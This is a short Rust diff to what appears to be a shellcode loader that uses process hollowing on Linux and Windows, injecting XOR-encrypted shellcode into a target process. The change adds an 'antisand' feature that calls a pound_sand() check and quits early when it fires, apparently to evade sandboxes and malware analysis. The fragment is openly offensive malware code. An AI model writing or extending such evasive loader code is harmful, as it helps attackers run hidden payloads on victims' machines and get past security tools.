@@ -5,14 +5,25 @@ use std::str;
 mod rco_process_hollowing_linux;
 #[cfg(target_os = "linux")]
 use rco_process_hollowing_linux::hollow_and_run;
+#[cfg(all(target_os = "linux", feature = "antisand"))]
+use rco_utils::pound_sand;
 
 #[cfg(windows)]
 mod rco_process_hollowing_windows;
 #[cfg(windows)]
 use rco_process_hollowing_windows::hollow_and_run;
+#[cfg(all(windows, feature = "antisand"))]
+use rco_utils::pound_sand;
 
+#[cfg(not(feature = "antisand"))]
+use rco_utils::pound_sand;
 
 fn main() {
+    if cfg!(feature = "antisand") {
+        if pound_sand() == true {
+            return
+        }
+    }
     if cfg!(feature = "xor") {
         let (shellcode, target_process) = if cfg!(windows) {
             (rco_config::ENCRYPTED_WINDOWS_SHELLCODE, rco_config::ENCRYPTED_WINDOWS_HOLLOWING_TARGET)
